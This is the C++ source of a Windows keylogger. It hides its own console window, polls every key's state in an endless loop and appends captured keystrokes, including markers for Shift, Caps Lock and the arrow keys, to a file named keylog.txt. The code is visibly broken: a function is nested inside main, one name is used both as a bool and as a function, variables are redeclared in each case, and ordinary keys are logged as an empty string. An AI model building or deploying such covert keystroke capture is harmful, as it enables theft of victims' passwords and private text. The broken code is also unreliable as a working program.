//This program records keystrokes in a text file called "keylog.txt"

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <winuser.h>
#include <string>
#include <fstream> 
#include <iostream>
using namespace std;

int main()
{
	
	string keystroke;
	bool special_keys;
	
	special_keys(int S_key)
	{
		
	switch (S_key) 
	{
	case VK_SPACE:
		cout << " ";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << " ";
    			logFile.close();
  		}
		return true;
	case VK_RETURN:
		cout << "\n";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "\n";
    			logFile.close();
  		}
		return true;
	case VK_BACK:
		cout << "\b";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "\b";
    			logFile.close();
  		}
		return true;
	case VK_OEM_PERIOD:
		cout << ".";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << ".";
    			logFile.close();
  		}
		return true;
	case VK_OEM_COMMA:
		cout << ",";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << ",";
    			logFile.close();
  		}
		return true;
	case VK_OEM_7:
		cout << "'";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "'";
    			logFile.close();
  		}
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#SHIFT#";
    			logFile.close();
  		}
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#CAPS_LOCK";
    			logFile.close();
  		}
		return true;
	case VK_TAB:
		cout << "#TAB";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#TAB";
    			logFile.close();
  		}
		return true;
	case VK_UP:
		cout << "#UP";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#UP";
    			logFile.close();
  		}
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#DOWN";
    			logFile.close();
  		}
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#LEFT";
    			logFile.close();
  		}
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << "#RIGHT";
    			logFile.close();
  		}
		return true;
	default: 
		return false;
	}

	}
	
	
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
	char key = 'a';

	while (true)
  	{
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
      			{
					
				if (special_keys(key) == false) //Checks to see if a special key was pressed
        			{
						
					fstream logFile;
 	 				logFile.open("keylog.txt", fstream::app);
  					if(logFile.is_open())
  					{
    						logFile << keystroke;
    						logFile.close();
  					}
					
				}
			}
		}
	}
	
	
	return 0;
}
	
